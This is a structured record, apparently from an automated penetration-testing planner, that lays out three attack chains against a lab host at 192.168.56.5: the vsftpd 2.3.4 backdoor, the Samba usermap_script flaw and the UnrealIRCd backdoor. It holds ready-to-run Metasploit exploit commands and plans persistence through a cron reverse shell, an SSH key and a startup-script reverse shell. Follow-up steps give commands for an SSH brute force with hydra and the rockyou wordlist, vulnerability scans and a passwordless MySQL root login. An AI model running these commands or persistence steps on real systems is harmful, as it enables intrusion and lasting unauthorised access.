attack_chains.name: Chain 1: vsftpd Backdoor -> Shell Access -> Persistence via Cron

initial_access.description: Exploit vsftpd 2.3.4 backdoor on port 21 for root shell
commands: msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 192.168.56.5; set RPORT 21; run'

privilege_escalation.description: Backdoor provides root access; verify and stabilize shell

persistence.description: Add cron job for reverse shell

attack_chains.name: Chain 2: Samba Usermap -> Command Execution -> Persistence via SSH Key

initial_access.description: Exploit Samba usermap_script (CVE-2007-2447) on port 445 for command execution

privilege_escalation.description: Gain shell and escalate to root using known weak creds or kernel exploits

persistence.description: Install SSH public key for persistent access

attack_chains.name: Chain 3: UnrealIRCd Backdoor -> IRC Shell -> Persistence via Backdoor Service

initial_access.description: Exploit UnrealIRCd backdoor (CVE-2010-2075) on port 6667 for shell
commands: msfconsole -q -x 'use exploit/unix/irc/unreal_ircd_3281_backdoor; set RHOSTS 192.168.56.5; set RPORT 6667; run'

privilege_escalation.description: Stabilize shell and check privileges; use local exploits if needed

persistence.description: Add reverse shell to startup script

followup_requests: Run detailed Nmap script scan: nmap -sV --script=vuln -p- 192.168.56.5
Attempt SSH brute force with common creds: hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.5
Scan for web vulnerabilities: nikto -h http://192.168.56.5
Check MySQL remote login: mysql -h 192.168.56.5 -u root -p''
